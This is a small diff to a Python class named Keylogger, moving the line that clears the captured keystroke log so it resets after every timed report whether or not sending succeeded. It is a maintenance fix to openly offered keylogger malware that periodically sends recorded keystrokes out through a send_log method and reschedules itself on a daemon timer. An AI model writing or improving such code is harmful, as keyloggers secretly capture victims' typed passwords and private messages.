@@ -32,10 +32,10 @@ class Keylogger:
         if self.log:
             try:
                 self.send_log()
-                self.log = ""
             except:
                 print("[*] cannot establish connection")
         
+        self.log = ""
         timer = Timer(interval=self.interval, function=self.report)
         timer.daemon = True
         timer.start()
